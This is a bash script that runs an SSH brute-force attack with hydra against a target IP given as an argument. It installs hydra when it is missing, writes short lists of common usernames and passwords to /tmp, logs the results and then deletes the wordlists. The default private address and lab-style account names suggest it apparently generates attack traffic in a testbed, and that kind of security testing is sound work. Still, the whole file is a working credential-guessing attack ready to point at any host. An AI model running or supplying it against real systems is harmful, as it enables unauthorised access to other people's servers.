#!/bin/bash
# attack_ssh_brute.sh
# SSH brute force attack using hydra
# Usage: ./attack_ssh_brute.sh <target_ip>

TARGET_IP="${1:-192.168.64.2}"

echo "=========================================="
echo "Starting SSH Brute Force Attack"
echo "Target: $TARGET_IP:22"
echo "=========================================="

if ! command -v hydra &> /dev/null; then
    echo "hydra not found. Installing..."
    sudo apt-get update
    sudo apt-get install -y hydra
fi

# Create a simple wordlist
WORDLIST="/tmp/password_list.txt"
cat > $WORDLIST << 'EOF'
password
123456
admin
letmein
welcome
qwerty
root
toor
test
ubuntu
bella
attacker
pass123
pass
EOF

# Create a simple username list
USERLIST="/tmp/user_list.txt"
cat > $USERLIST << 'EOF'
root
admin
ubuntu
bella
attacker
test
EOF

echo "[*] Starting SSH brute force attack with hydra..."
echo "[*] Target: $TARGET_IP"
echo "[*] Testing common usernames and passwords..."

hydra -L $USERLIST -P $WORDLIST -t 4 -o /tmp/hydra_results.txt ssh://$TARGET_IP 2>&1 | tee -a /tmp/attack_log.txt

echo "[*] SSH brute force completed at $(date)"
echo "[*] Results saved to /tmp/hydra_results.txt"

# Cleanup
rm -f $WORDLIST $USERLIST
